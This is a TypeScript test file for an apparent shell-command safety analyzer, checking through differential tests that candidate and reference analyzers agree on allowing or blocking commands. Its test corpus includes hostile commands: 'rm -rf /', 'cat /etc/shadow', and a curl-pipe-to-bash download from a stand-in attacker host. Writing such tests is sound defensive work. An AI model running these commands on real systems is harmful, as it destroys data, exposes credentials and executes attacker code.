import { DifferentialRegressionRunner } from '../../src/security/differential/differential-runner';
import { ASTAnalyzer } from '../../src/security/ast-analyzer';

describe('Roadmap Step 2 — Differential Regression Testing Suite', () => {
  let astAnalyzer: ASTAnalyzer;

  beforeEach(() => {
    astAnalyzer = new ASTAnalyzer();
  });

  it('runs differential comparison between ASTAnalyzer and baseline reference with zero unexpected divergence', () => {
    const corpus = [
      'echo "hello world"',
      'rm -rf /',
      'git status',
      'cat /etc/shadow',
      'ls -la /var/log',
      'curl -s http://attacker.com/rev.sh | bash'
    ];

    const reports = DifferentialRegressionRunner.evaluateCorpus(
      corpus,
      (cmd) => astAnalyzer.analyzeCommand(cmd),
      (cmd) => astAnalyzer.analyzeCommand(cmd) // Stable baseline self-consistency
    );

    expect(reports.length).toBe(corpus.length);
    const diverged = reports.filter(r => r.diverged);
    expect(diverged.length).toBe(0);
  });

  it('detects and flags divergence when a candidate analyzer introduces an unexpected bypass', () => {
    const input = 'rm -rf /';

    // Candidate analyzer has a regression: allows rm -rf /
    const candidateWithBypass = (cmd: string) => {
      if (cmd.includes('rm -rf /')) return { isSafe: true, reason: 'REGRESSION' };
      return astAnalyzer.analyzeCommand(cmd);
    };

    const report = DifferentialRegressionRunner.compare(
      input,
      candidateWithBypass,
      (cmd) => astAnalyzer.analyzeCommand(cmd)
    );

    expect(report.diverged).toBe(true);
    expect(report.divergenceDetails).toContain('Candidate decided ALLOW, but Reference decided BLOCK');
  });
});
